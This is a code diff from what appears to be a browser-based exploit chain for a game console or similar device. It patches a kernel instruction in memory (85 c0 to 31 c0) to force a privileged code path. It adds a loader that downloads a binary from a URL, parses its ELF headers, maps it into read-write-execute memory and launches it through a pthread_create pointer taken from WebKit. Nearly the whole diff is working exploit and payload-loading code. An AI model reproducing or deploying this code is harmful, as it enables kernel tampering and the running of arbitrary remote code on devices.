@@ -1486,12 +1486,18 @@ async function attempt(ctx, opts) {
     say("[dbg] before: " + hx(body, lo, callOff));
     say("[dbg] after : " + hx(body, callOff + 5, hi));
 
-    var jnzRva = fnRva + callOff + 7;
-    var testRva = jnzRva - 2;
-    var plist = [[testRva, "31c0", "rcmgr-force-fill"]];
-    k.apply(kbase, plist);
-    say("[dbg] neutralised test at rva 0x" + testRva.toString(16)
-        + " (85 c0 -> 31 c0) -- fill block always runs");
+    var jnzOff = -1;
+    for (var i = callOff + 5; i < callOff + 16 && i < body.length; i++) {
+      if (body[i] === 0x75) { jnzOff = i; break; }
+    }
+    if (jnzOff < 0) { say("[dbg] no JNZ after CALL"); return; }
+
+    var testRva = fnRva + jnzOff - 2;
+    var jnzRva  = fnRva + jnzOff;
+    say("[dbg] test at rva 0x" + testRva.toString(16) + ", jnz at rva 0x" + jnzRva.toString(16));
+
+    k.apply(kbase, [[testRva, "31c0", "rcmgr-test"]]);
+    say("[dbg] test neutralised (85 c0 -> 31 c0)");
 
     var chk = k.read(plus(kbase, testRva), 2);
     say("[dbg] bytes now: " + (chk ? (chk[0].toString(16) + " " + chk[1].toString(16)) : "unreadable"));
@@ -1543,6 +1549,96 @@ async function fetchBytes(url, tag) {
   }
 }
 
+function elfInfo(blob) {
+  if (blob.length < 0x40) return null;
+  if (blob[0] !== 0x7f || blob[1] !== 0x45 || blob[2] !== 0x4c || blob[3] !== 0x46) return null;
+  if (blob[4] !== 2) return null; /* ELFCLASS64 only */
+  const dv = new DataView(blob.buffer, blob.byteOffset, blob.length);
+  const entry = Number(dv.getBigUint64(0x18, true));
+  const phoff = Number(dv.getBigUint64(0x20, true));
+  const phentsize = dv.getUint16(0x36, true);
+  const phnum = dv.getUint16(0x38, true);
+  const segs = [];
+  for (let i = 0; i < phnum; i++) {
+    const o = phoff + i * phentsize;
+    if (o + 0x38 > blob.length) break;
+    const type = dv.getUint32(o, true);
+    if (type !== 1) continue; /* PT_LOAD */
+    segs.push({
+      off: Number(dv.getBigUint64(o + 0x08, true)),
+      vaddr: Number(dv.getBigUint64(o + 0x10, true)),
+      filesz: Number(dv.getBigUint64(o + 0x20, true)),
+      memsz: Number(dv.getBigUint64(o + 0x28, true)),
+    });
+  }
+  if (!segs.length) return null;
+  return { entry: entry, segs: segs };
+}
+
+async function loadElf(url, blob) {
+  const c = host();
+  const info = elfInfo(blob);
+  if (!info) { say("[p] " + url + " is an ELF but has no PT_LOAD -- refusing"); return false; }
+  say("[p] " + url + " is an ELF: entry 0x" + info.entry.toString(16)
+      + ", " + info.segs.length + " loadable segments");
+
+  let lo = Infinity, hi = 0;
+  for (const s of info.segs) {
+    lo = Math.min(lo, s.vaddr);
+    hi = Math.max(hi, s.vaddr + s.memsz);
+  }
+  const base = lo & ~0xfff;
+  const size = ((hi - base) + 0xfff) & ~0xfff;
+  say("[p] mapping 0x" + size.toString(16) + " at base 0x" + base.toString(16));
+
+  const m = sc(S.mmap, base, size, 3, 0x1002, -1, 0);
+  const got = v(m.lo, m.hi);
+  if (m.i32 === -1 || (got.hi >>> 0) === 0) {
+    say("[p] mmap failed, errno " + c.errno()); return false;
+  }
+  for (let o = 0; o < size; o += 0x1000) wr4(plus(got, o), 0);
+  if (sc(S.mprotect, got, size, 7).i32 !== 0) {
+    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
+  }
+
+  for (const s of info.segs) {
+    const dst = plus(got, s.vaddr - base);
+    for (let o = 0; o < s.filesz; o += 8) {
+      let l = 0, h = 0;
+      for (let k = 0; k < 4; k++) l |= (blob[s.off + o + k] || 0) << (8 * k);
+      for (let k = 0; k < 4; k++) h |= (blob[s.off + o + 4 + k] || 0) << (8 * k);
+      c.p.write8(plus(dst, o), v(l >>> 0, h >>> 0));
+    }
+    say("[p] segment vaddr 0x" + s.vaddr.toString(16) + " filesz 0x" + s.filesz.toString(16)
+        + " memsz 0x" + s.memsz.toString(16));
+  }
+
+  const entry = plus(got, info.entry - base);
+  say("[p] entry at " + text(entry) + " -- starting thread");
+
+  const SLOT_1352 = 0x3cb9c00;
+  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
+    ? c.off.wk___imp_pthread_create : SLOT_1352;
+  if (!c.webkitBase || !c.libkernelBase) {
+    say("[p] no module bases -- ELF sits loaded at " + text(got) + ", not started");
+    return false;
+  }
+  const fnr = c.p.read8(c.webkitBase.add32(slot));
+  const fn = v(fnr.low, fnr.hi);
+  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
+  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
+    say("[p] pthread_create slot holds " + text(fn) + ", not in libkernel -- not calling it");
+    return false;
+  }
+
+  const thr = alloc(8); thr.u8.fill(0);
+  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
+  const handle = qAt(thr, 0);
+  const started = rc === 0 && (handle.hi >>> 0) > 0;
+  say("[p] " + blob.length + " bytes ELF, thread rc=" + rc + (started ? " -- running" : " -- did NOT start"));
+  return started;
+}
+
 async function loadPayload(url) {
   const c = host();
   const blob = await fetchBytes(url, "p");
@@ -1550,6 +1646,11 @@ async function loadPayload(url) {
   say("[p] got " + blob.length + " bytes, first=0x" + (blob[0] || 0).toString(16));
 
   if (!blob.length) { say("[p] " + url + " is empty"); return false; }
+
+  if (blob[0] === 0x7f && blob[1] === 0x45 && blob[2] === 0x4c && blob[3] === 0x46) {
+    return loadElf(url, blob);
+  }
+
   if (blob[0] !== 0xe9) {
     say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
     return false;
